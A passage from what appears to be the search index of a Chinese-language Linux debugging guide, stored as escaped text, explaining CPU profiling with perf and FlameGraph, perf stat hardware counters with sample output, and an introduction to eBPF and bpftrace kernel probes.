\u200b\u6bd4\u4f8b\u200b\u3002\u200b\u4e8e\u662f\u200b\uff0c\u200b\u8d8a\u200b\u5bbd\u200b\u7684\u200b\u6761\u200b\u5c31\u200b\u4ee3\u8868\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u7684\u200b\u51fd\u6570\u200b\uff08\u200b\u4ee5\u53ca\u200b\u5176\u200b\u8c03\u7528\u200b\u7684\u200b\u51fd\u6570\u200b\uff09\u200b\u5360\u7528\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u8d8a\u200b\u591a\u200b\u3002\u200b\u53ef\u4ee5\u200b\u70b9\u51fb\u200b\u611f\u5174\u8da3\u200b\u7684\u200b\u51fd\u6570\u200b\u6765\u200b\u300c\u200b\u4e13\u6ce8\u200b\u300d\u200b\u4e8e\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b\u5185\u90e8\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u5206\u6790\u200b\u300c\u200b\u70ed\u70b9\u200b\u300d\uff1f</p> <p>\u200b\u963f\u59c6\u200b\u8fbe\u5c14\u200b\u5b9a\u5f8b\u200b\uff08Amdahl's Law\uff09\u200b\u6307\u51fa\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u90e8\u5206\u200b\u7684\u200b\u6267\u884c\u200b\u65f6\u95f4\u200b\u5360\u200b\u603b\u4f53\u200b\u7684\u200b\u6bd4\u200b\u91cd\u5927\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f18\u5316\u200b\u8fd9\u4e2a\u200b\u90e8\u5206\u200b\uff08\u200b\u70ed\u70b9\u200b\uff09\u200b\u5c31\u200b\u80fd\u200b\u663e\u8457\u200b\u63d0\u5347\u200b\u6574\u4f53\u200b\u6027\u80fd\u200b\uff1b\u200b\u76f8\u53cd\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u200b\u90e8\u5206\u200b\u6240\u200b\u5360\u200b\u7684\u200b\u65f6\u95f4\u200b\u6bd4\u4f8b\u200b\u5f88\u5c0f\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4f18\u5316\u200b\u5f97\u200b\u518d\u200b\u591a\u200b\uff0c\u200b\u5bf9\u200b\u6574\u4f53\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u4e5f\u200b\u5341\u5206\u200b\u6709\u9650\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b\u7a0b\u5e8f\u200b\u7684\u200b 90% \u200b\u65f6\u95f4\u200b\u90fd\u200b\u82b1\u200b\u5728\u200b\u4e86\u200b\u51fd\u6570\u200b A \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u200b\u51fd\u6570\u200b A \u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u5373\u4f7f\u200b\u53ea\u200b\u63d0\u5347\u200b 10% \u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u4e5f\u200b\u80fd\u200b\u8ba9\u200b\u6574\u4f53\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b 9.9%\uff1b\u200b\u4f46\u200b\u5982\u679c\u200b\u51fd\u6570\u200b B \u200b\u53ea\u200b\u5360\u7528\u200b\u4e86\u200b 1% \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5373\u4f7f\u200b\u8ba9\u200b\u51fd\u6570\u200b B \u200b\u63d0\u5347\u200b\u4e86\u200b 99% \u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u6574\u4f53\u200b\u6027\u80fd\u200b\u4e5f\u200b\u53ea\u80fd\u200b\u63d0\u5347\u200b\u4e0d\u5230\u200b 1%\u3002</p> <p>SVG \u200b\u706b\u7130\u200b\u56fe\u7531\u200b Brendan Gregg \u200b\u7684\u200b FlameGraph \u200b\u9879\u76ee\u200b\u751f\u6210\u200b\uff0c\u200b\u5176\u200b\u652f\u6301\u200b\u5305\u62ec\u200b <code>perf</code> \u200b\u5728\u5185\u200b\u7684\u200b\u591a\u79cd\u200b\u6027\u80fd\u200b\u5206\u6790\u200b\u5de5\u5177\u200b\u7684\u200b\u8f93\u51fa\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ee5\u200b <code>perf</code> \u200b\u4e3a\u4f8b\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b clone FlameGraph \u200b\u4ed3\u5e93\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>perf record</code> \u200b\u547d\u4ee4\u200b\u5bf9\u200b\u7a0b\u5e8f\u200b\u91c7\u6837\u200b\uff1a</p> <pre><code>git clone https://github.com/brendangregg/FlameGraph\n# \u200b\u4ece\u5934\u200b\u6267\u884c\u7a0b\u5e8f\u200b\nperf record -F 499 --call-graph dwarf,64000 -g -- stress -c 1 -t 10\n# \u200b\u9644\u52a0\u200b\u5230\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\nperf record -F 499 --call-graph dwarf,64000 -g -p 12345\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-F</code> \u200b\u6307\u5b9a\u200b\u4e86\u200b\u91c7\u6837\u200b\u9891\u7387\u200b\u4e3a\u200b 499 Hz\uff0c<code>-g</code> \u200b\u4ee3\u8868\u200b\u91c7\u6837\u200b\u51fd\u6570\u8c03\u7528\u200b\u6808\u200b\uff0c<code>--call-graph</code> \u200b\u53c2\u6570\u200b\u6307\u5b9a\u200b\u4e86\u200b\u8c03\u7528\u200b\u6808\u200b\u7684\u200b\u91c7\u6837\u200b\u65b9\u5f0f\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u91c7\u6837\u200b\u9891\u7387\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u6574\u767e\u200b\u7684\u200b\u6570\u5b57\u200b\uff1f</p> <p>\u200b\u4ee5\u4e0a\u200b\u5185\u5bb9\u200b\u4e2d\u200b\u91c7\u6837\u200b\u9891\u7387\u200b\u8bbe\u7f6e\u200b\u4e3a\u4e86\u200b 499 Hz\u3002\u200b\u5982\u679c\u200b\u9605\u8bfb\u200b\u522b\u7684\u200b\u6559\u7a0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u4e0d\u5c11\u200b\u4e5f\u200b\u4f1a\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 99 Hz\u3002\u200b\u907f\u5f00\u200b 500 \u200b\u6216\u8005\u200b 100 \u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u67d0\u4e9b\u200b\u4e8b\u4ef6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6070\u597d\u200b\u95f4\u9694\u200b 10ms\uff08100 Hz\uff09\u200b\u6216\u8005\u200b 2ms\uff08500 Hz\uff09\u200b\u53d1\u751f\u200b\uff0c\u200b\u5982\u679c\u200b\u91c7\u6837\u200b\u9891\u7387\u200b\u4e0e\u200b\u8fd9\u4e9b\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u5468\u671f\u200b\u521a\u597d\u200b\u5339\u914d\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u7ed3\u679c\u200b\u51fa\u73b0\u200b\u504f\u5dee\u200b\u3002\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u6070\u597d\u200b\u6574\u767e\u51cf\u200b\u4e00\u200b\u53ef\u4ee5\u200b\u6700\u5927\u200b\u7a0b\u5ea6\u200b\u907f\u514d\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u91c7\u6837\u200b\u65b9\u5f0f\u200b</p> <p><code>perf</code> \u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u91c7\u6837\u200b\u65b9\u5f0f\u200b\uff1a</p> <ul> <li> <p><code>fp</code>\uff08\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\uff09\uff1a\u200b\u6839\u636e\u200b frame pointer \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u7684\u200b\u4fe1\u606f\u200b\u91c7\u6837\u200b\u3002\u200b\u5728\u200b\u51fd\u6570\u8c03\u7528\u200b\u65f6\u200b\uff0cframe pointer \u200b\u4f1a\u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u51fd\u6570\u200b\u7684\u200b\u6808\u200b\u5e27\u200b\uff08\u200b\u5373\u200b\u51fd\u6570\u200b\u5728\u200b\u6808\u200b\u4e0a\u200b\u4f7f\u7528\u200b\u7684\u200b\u5185\u5b58\u7a7a\u95f4\u200b\uff0c\u200b\u5185\u5bb9\u200b\u5305\u62ec\u200b\u5c40\u90e8\u53d8\u91cf\u200b\u3001\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u7b49\u200b\uff09\u3002\u200b\u5728\u200b x86_64 \u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0cframe pointer \u200b\u662f\u200b RBP \u200b\u5bc4\u5b58\u5668\u200b\u3002</p> <p>\u200b\u4e0d\u5c11\u200b\u7f16\u8bd1\u5668\u200b\u4f1a\u200b\u9009\u62e9\u200b\u4f18\u5316\u200b\u6389\u200b frame pointer \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5176\u200b\u4e0d\u662f\u200b\u7a0b\u5e8f\u6267\u884c\u200b\u5fc5\u9700\u200b\u7684\u200b\u3002\u200b\u5728\u200b 32 \u200b\u4f4d\u200b\u7684\u200b x86 \u200b\u67b6\u6784\u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u4f18\u5316\u200b\u662f\u200b\u975e\u5e38\u200b\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b x86 \u200b\u67b6\u6784\u200b\u7684\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u6570\u91cf\u200b\u975e\u5e38\u5c11\u200b\uff0c\u200b\u591a\u51fa\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u53ef\u4ee5\u200b\u6709\u6548\u200b\u63d0\u9ad8\u200b\u7a0b\u5e8f\u200b\u6027\u80fd\u200b\u3002\u200b\u4f46\u662f\u200b x86_64 \u200b\u67b6\u6784\u200b\u7684\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u6570\u91cf\u200b\u63d0\u5347\u200b\u4e86\u200b\u4e0d\u5c11\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u822c\u200b\u8ba4\u4e3a\u200b\u8fd9\u200b\u7c7b\u200b\u4f18\u5316\u200b\u5bf9\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u4e0d\u200b\u663e\u8457\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4f1a\u200b\u7ed9\u200b\u95ee\u9898\u200b\u8c03\u8bd5\u200b\u4e0e\u200b\u6027\u80fd\u200b\u8c03\u4f18\u200b\u5e26\u6765\u200b\u56f0\u96be\u200b\u3002\u200b\u8bf8\u5982\u200b Ubuntu\u3001Fedora\u3001Arch Linux \u200b\u7b49\u200b\u5747\u200b\u5df2\u7ecf\u200b\u9ed8\u8ba4\u200b\u5f00\u542f\u200b frame pointer\u3002</p> <p>\u200b\u5728\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b <code>-fno-omit-frame-pointer</code> \u200b\u9009\u9879\u200b\u6765\u200b\u7981\u7528\u200b\u8fd9\u79cd\u200b\u4f18\u5316\u200b\u3002</p> </li> <li> <p><code>lbr</code>\uff1a\u200b\u4f7f\u7528\u200b Last Branch Record \u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u91c7\u6837\u200b\uff0c\u200b\u9700\u8981\u200b CPU \u200b\u67b6\u6784\u200b\u652f\u6301\u200b\u3002LBR \u200b\u5bc4\u5b58\u5668\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u6700\u8fd1\u200b\u7684\u200b\u5206\u652f\u200b\u8df3\u8f6c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u6709\u200b\u6743\u9650\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u8ba9\u200b LBR \u200b\u5bc4\u5b58\u5668\u200b\u4ec5\u200b\u8bb0\u5f55\u200b <code>call</code> \u200b\u548c\u200b <code>ret</code> \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u51fd\u6570\u8c03\u7528\u200b\u6808\u200b\u7684\u200b\u91c7\u6837\u200b\u3002\u200b\u867d\u7136\u200b\u4e0d\u200b\u9700\u8981\u200b\u7a0b\u5e8f\u200b\u8c03\u6574\u200b\u7f16\u8bd1\u200b\u53c2\u6570\u200b\uff0c\u200b\u4f46\u662f\u200b\u786c\u4ef6\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6570\u91cf\u200b\u662f\u200b\u6709\u9650\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u8fc7\u6df1\u200b\u7684\u200b\u51fd\u6570\u8c03\u7528\u200b\u3002</p> </li> <li><code>dwarf</code>\uff1a\u200b\u4f7f\u7528\u200b DWARF \u200b\u8c03\u8bd5\u4fe1\u606f\u200b\u6765\u200b\u91c7\u6837\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u9700\u8981\u200b\u7a0b\u5e8f\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u5f00\u542f\u200b DWARF \u200b\u8c03\u8bd5\u4fe1\u606f\u200b\uff08<code>gcc -g</code>\uff09\uff0c\u200b\u5f00\u9500\u200b\u76f8\u5bf9\u200b\u8f83\u200b\u9ad8\u200b\u3002\u200b\u4e0a\u200b\u6587\u4e2d\u200b <code>--call-graph dwarf,64000</code> \u200b\u7684\u200b <code>64000</code> \u200b\u4ee3\u8868\u200b\u6bcf\u6b21\u200b\u91c7\u6837\u200b\u65f6\u200b\u8bb0\u5f55\u200b\u6700\u200b\u591a\u200b 64000 \u200b\u5b57\u8282\u200b\u7684\u200b stack dump\u3002</li> </ul> <p>\u200b\u91c7\u6837\u200b\u5b8c\u6210\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u5b58\u50a8\u200b\u5728\u200b <code>perf.data</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff08\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-o</code> \u200b\u53c2\u6570\u200b\u4fee\u6539\u200b\uff09\u3002\u200b\u63a5\u4e0b\u6765\u200b\u4f7f\u7528\u200b <code>perf script</code> \u200b\u8f93\u51fa\u200b trace\uff0c\u200b\u5e76\u200b\u5728\u200b\u9884\u5904\u7406\u200b\u6570\u636e\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b FlameGraph \u200b\u751f\u6210\u200b\u706b\u7130\u200b\u56fe\u200b\uff1a</p> <pre><code>perf script &gt; out.perf\nFlameGraph/stackcollapse-perf.pl out.perf &gt; out.folded\nFlameGraph/flamegraph.pl out.folded &gt; out.svg\n</code></pre> <p><code>perf report</code></p> <p><code>perf.data</code> \u200b\u6587\u4ef6\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b TUI \u200b\u7684\u200b <code>perf report</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u3002<code>perf report</code> \u200b\u7684\u200b annotate \u200b\u529f\u80fd\u200b\u53ef\u4ee5\u200b\u5c55\u793a\u200b\u51fd\u6570\u200b\u5185\u90e8\u200b\u6c47\u7f16\u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4ee3\u7801\u200b\uff08\u200b\u5982\u679c\u200b\u6709\u200b\u8c03\u8bd5\u4fe1\u606f\u200b\uff09\u200b\u91c7\u6837\u200b\u5f97\u5230\u200b\u7684\u200b\u65f6\u95f4\u200b\u5360\u200b\u6bd4\u200b\u3002</p> <p>\u200b\u6ce8\u610f\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e0d\u9002\u200b\u7528\u4e8e\u200b\u89e3\u91ca\u200b\u578b\u200b\u4e0e\u200b JIT \u200b\u7c7b\u200b\u7684\u200b\u8bed\u8a00\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u8bed\u8a00\u200b\u7684\u200b\u51fd\u6570\u8c03\u7528\u200b\u6808\u200b\u96be\u4ee5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u89e3\u91ca\u5668\u200b/\u200b\u8fd0\u884c\u200b\u65f6\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u83b7\u53d6\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u5404\u4e2a\u200b\u8bed\u8a00\u200b\u7684\u200b\u4e13\u7528\u5de5\u5177\u200b\u5904\u7406\u200b\u3002</p> <p>@taoky: \u200b\u5feb\u901f\u200b\u751f\u6210\u200b\u706b\u7130\u200b\u56fe\u200b</p> <p>\u200b\u6211\u200b\u8fd8\u662f\u200b\u89c9\u5f97\u200b\u6bcf\u6b21\u200b\u90fd\u200b\u8981\u200b\u5199\u200b\u8fd9\u4e48\u200b\u591a\u200b\u547d\u4ee4\u200b\u6709\u70b9\u200b\u9ebb\u70e6\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u200b\u81ea\u5df1\u200b\u4e00\u822c\u200b\u76f4\u63a5\u200b\u7528\u200b flamegraph-rs/flamegraph\uff0c\u200b\u4e8e\u662f\u200b\u76f4\u63a5\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u751f\u6210\u200b\u4e86\u200b\uff1a</p> <pre><code>flamegraph -p 12345\n</code></pre>"},{"location":"ops/debug/#hardware-counter","title":"\u83b7\u53d6\u200b\u786c\u4ef6\u200b\u8ba1\u6570\u5668\u200b\u7edf\u8ba1\u200b\u4fe1\u606f","text":"<p><code>perf stat</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u786c\u4ef6\u200b\u8ba1\u6570\u5668\u200b\u7684\u200b\u7edf\u8ba1\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u4e86\u89e3\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6027\u80fd\u200b\u74f6\u9888\u200b\uff1a</p> <pre><code>$ perf stat uname\nLinux\n\n Performance counter stats for 'uname':\n\n              1.34 msec task-clock:u                     #    0.537 CPUs utilized\n                 0      context-switches:u               #    0.000 /sec\n                 0      cpu-migrations:u                 #    0.000 /sec\n                67      page-faults:u                    #   50.119 K/sec\n           228,089      cpu_atom/instructions/u          #    0.75  insn per cycle              (67.70%)\n     &lt;not counted&gt;      cpu_core/instructions/u                                                 (0.00%)\n           305,397      cpu_atom/cycles/u                #    0.228 GHz\n     &lt;not counted&gt;      cpu_core/cycles/u                                                       (0.00%)\n            41,051      cpu_atom/branches/u              #   30.708 M/sec\n     &lt;not counted&gt;      cpu_core/branches/u                                                     (0.00%)\n             3,065      cpu_atom/branch-misses/u         #    7.47% of all branches\n     &lt;not counted&gt;      cpu_core/branch-misses/u                                                (0.00%)\n             TopdownL1 (cpu_atom)                 #     50.3 %  tma_bad_speculation\n                                                  #     16.1 %  tma_retiring\n             TopdownL1 (cpu_atom)                 #      0.0 %  tma_backend_bound\n                                                  #     33.7 %  tma_frontend_bound\n\n       0.002489347 seconds time elapsed\n\n       0.000000000 seconds user\n       0.002576000 seconds sys\n</code></pre> <p>\u200b\u6839\u636e\u200b CPU \u200b\u67b6\u6784\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c<code>perf stat</code> \u200b\u9ed8\u8ba4\u200b\u663e\u793a\u200b\u7684\u200b\u8ba1\u6570\u5668\u200b\u4fe1\u606f\u200b\u4e5f\u200b\u4f1a\u200b\u5b58\u5728\u200b\u533a\u522b\u200b\u3002\u200b\u4ee5\u4e0a\u200b\u547d\u4ee4\u200b\u662f\u200b\u5728\u200b\u4e00\u53f0\u200b\u8fd0\u884c\u200b Intel 12 \u200b\u4ee3\u200b i5 CPU \u200b\u7684\u200b\u673a\u5668\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5176\u200b\u5305\u542b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\u8ba1\u6570\u5668\u200b\u4fe1\u606f\u200b\uff1a</p> <ul> <li>\u200b\u5927\u5c0f\u200b\u6838\u200b\uff08core &amp; atom\uff09\u200b\u7684\u200b\u8ba1\u6570\u5668\u200b\u4fe1\u606f\u200b\u3002</li> <li><code>tma</code>\uff1aTopdown Microarchitecture Analysis\uff0cIntel \u200b\u63d0\u4f9b\u200b\u7684\u200b\u7528\u4e8e\u200b\u5206\u6790\u200b CPU \u200b\u7684\u200b\u6027\u80fd\u200b\u74f6\u9888\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002<ul> <li>\u200b\u6709\u5173\u200b\u4f7f\u7528\u200b <code>perf</code> \u200b\u5229\u7528\u200b TMA \u200b\u65b9\u6cd5\u200b\u5206\u6790\u7a0b\u5e8f\u200b\u7684\u200b\u6b65\u9aa4\u200b\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b https://perfwiki.github.io/main/top-down-analysis/\u3002</li> </ul> </li> </ul> <p>\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u611f\u5174\u8da3\u200b\u7684\u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u663e\u793a\u200b CPU \u200b\u8fd0\u884c\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u3001\u200b\u547d\u4ee4\u200b\u6570\u200b\u3001\u200b\u7f13\u5b58\u200b\u547d\u4e2d\u200b\u4e0e\u200b\u5931\u6548\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ perf stat -e cycles,instructions,cache-references,cache-misses stress -c 1 -m 1 -t 5\nstress: info: [1968709] dispatching hogs: 1 cpu, 0 io, 1 vm, 0 hdd\nstress: info: [1968709] successful run completed in 5s\n\n Performance counter stats for 'stress -c 1 -m 1 -t 5':\n\n     5,988,155,941      cpu_atom/cycles/u                                                       (22.77%)\n     6,878,171,900      cpu_core/cycles/u                                                       (92.90%)\n     6,948,484,803      cpu_atom/instructions/u          #    1.16  insn per cycle              (22.77%)\n     7,087,148,185      cpu_core/instructions/u          #    1.03  insn per cycle              (92.90%)\n         6,294,530      cpu_atom/cache-references/u                                             (22.77%)\n         1,730,791      cpu_core/cache-references/u                                             (92.90%)\n         6,225,141      cpu_atom/cache-misses/u          #   98.90% of all cache refs           (22.77%)\n         1,593,046      cpu_core/cache-misses/u          #   92.04% of all cache refs           (92.90%)\n\n       5.002407973 seconds time elapsed\n\n       5.639733000 seconds user\n       4.324169000 seconds sys\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b perf-stat(1) \u200b\u4e86\u89e3\u200b\u5982\u4f55\u200b\u83b7\u53d6\u200b\u53ef\u7528\u200b\u7684\u200b\u8ba1\u6570\u5668\u200b\u7684\u200b\u5217\u8868\u200b\u3002</p>"},{"location":"ops/debug/#ebpf","title":"eBPF","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b eBPF \u200b\u7684\u200b\u4f7f\u7528\u200b\u3002 \u200b\u5728\u200b\u9047\u5230\u200b\u7591\u96be\u95ee\u9898\u200b\u65f6\u200b\uff0ceBPF \u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u6211\u4eec\u200b\u4ee5\u200b\u975e\u5e38\u4f4e\u200b\u7684\u200b\u4ee3\u4ef7\u200b\u5728\u7ebf\u200b\u4e0a\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u83b7\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u4e0e\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002 \u200b\u5bf9\u4e8e\u200b\u9700\u8981\u200b\u83b7\u53d6\u200b\u5185\u6838\u200b\u4fe1\u606f\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u5f88\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u9605\u8bfb\u200b\u5185\u6838\u200b\u6e90\u7801\u200b\uff0celixir.bootlin.com \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u65b9\u4fbf\u200b\u7684\u200b\u5185\u6838\u200b\u6e90\u7801\u200b\u9605\u8bfb\u200b\u529f\u80fd\u200b\uff0c\u200b\u652f\u6301\u200b\u5feb\u901f\u200b\u8df3\u8f6c\u200b\u5230\u200b\u7b26\u53f7\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</p> <p>bcc \u200b\u4e0e\u200b bpftrace \u200b\u662f\u200b\u4e24\u4e2a\u200b\u5e38\u7528\u200b\u7684\u200b eBPF \u200b\u5de5\u5177\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5b83\u4eec\u200b\u7f16\u5199\u200b\u81ea\u5df1\u200b\u7684\u200b eBPF \u200b\u7a0b\u5e8f\u200b\u6765\u200b\u83b7\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u4fe1\u606f\u200b\u3002 \u200b\u6b64\u5916\u200b\uff0c\u200b\u5b83\u4eec\u200b\u8fd8\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5927\u91cf\u200b\u7684\u200b\uff08\u200b\u793a\u4f8b\u200b\uff09\u200b\u5de5\u5177\u200b\uff0c\u200b\u5bf9\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff0c\u200b\u5982\u200b\u4e0b\u9762\u200b\u4e24\u5f20\u200b\u56fe\u200b\u6240\u793a\u200b \uff08\u200b\u4ee5\u4e0b\u200b\u5de5\u5177\u200b\u7684\u200b\u4f7f\u7528\u200b\u8bf7\u200b\u81ea\u884c\u200b\u67e5\u9605\u200b\u8d44\u6599\u200b\uff09\uff1a</p> <p></p> <p></p> <p>\u200b\u8003\u8651\u200b\u5230\u200b bpftrace \u200b\u4f7f\u7528\u200b\u8f83\u4e3a\u7b80\u5355\u200b\uff08\u200b\u4e0d\u200b\u9700\u8981\u200b\u5199\u200b C \u200b\u4ee3\u7801\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u4ee5\u4e0b\u200b\u5bf9\u200b bpftrace \u200b\u505a\u200b\u7b80\u5355\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/debug/#kernel-ebpf","title":"\u5185\u6838\u200b\u6001","text":"<p>bpftrace \u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u51e0\u79cd\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u300c\u200b\u63a2\u9488\u200b\u300d\uff08probe\uff09\uff1a</p> <ul> <li>kprobe\uff1a\u200b\u9ed8\u8ba4\u200b\u5728\u200b\u51fd\u6570\u200b\u5165\u53e3\u5904\u200b\u63d2\u5165\u200b probe\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u504f\u79fb\u91cf\u200b\uff0c\u200b\u4ece\u800c\u200b\u5728\u200b\u51fd\u6570\u200b\u7684\u200b\u4efb\u610f\u200b\u4f4d\u7f6e\u200b\u63d2\u5165\u200b probe</li> <li>kretprobe\uff1a\u200b\u5728\u200b\u51fd\u6570\u200b\u8fd4\u56de\u200b\u65f6\u200b\u63d2\u5165\u200b probe\uff0c\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u51fd\u6570\u200b\u7684\u200b\u8fd4\u56de\u503c\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u83b7\u53d6\u200b\u51fd\u6570\u200b\u7684\u200b\u53c2\u6570\u200b</li> <li>tracepoint\uff1a\u200b\u5728\u200b\u5185\u6838\u200b\u9884\u5148\u200b\u5b9a\u4e49\u200b\u7684\u200b tracepoint \u200b\u5904\u200b\u63d2\u5165\u200b probe</li> <li>kfunc/kretfunc\uff1a\u200b\u5728\u200b\u51fd\u6570\u8c03\u7528\u200b/\u200b\u8fd4\u56de\u200b\u65f6\u200b\u63d2\u5165\u200b probe\uff0c\u200b\u76f8\u6bd4\u200b\u4e8e\u200b 